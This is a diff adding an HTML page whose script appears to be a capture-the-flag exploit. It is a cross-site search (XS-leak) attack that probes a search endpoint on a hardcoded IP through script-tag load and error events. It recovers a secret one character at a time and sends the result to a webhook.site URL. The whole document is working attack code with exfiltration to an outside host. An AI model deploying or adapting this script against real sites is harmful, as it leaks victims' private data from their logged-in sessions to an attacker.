@@ -1,0 +1,26 @@
+<html>
+    <script>
+        var ip = '209.97.140.29:30700';
+        var flag = 'Ba'; // init search word
+        var letters = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
+        var url = `http://${ip}/api/entries/search?q=`;
+        async function getLetter(ch){
+            return new Promise((resolve, reject)=>{
+            const script = document.createElement("script");
+            script.src = url+encodeURIComponent(flag+ch);
+            script.onload = () => ch==='}' ? reject(ch):resolve(ch);
+            script.onerror = () => reject(ch);
+            document.head.appendChild(script);
+            });
+        }
+        async function getFullWord(letters) {
+        var b = false; var ch;
+        for(var i=0; i < letters.length; i++){
+            await getLetter(letters[i]).then((res) => {flag=flag.concat(res); b = res==='x' ? true:false; i=0} , (res)=> { } );
+            if(b) break;
+        }
+        fetch(`https://webhook.site/ad2bd750-0149-4117-9995-70a03972206c/f=${flag}`);
+        };
+        getFullWord(letters);
+    </script>
+</html>
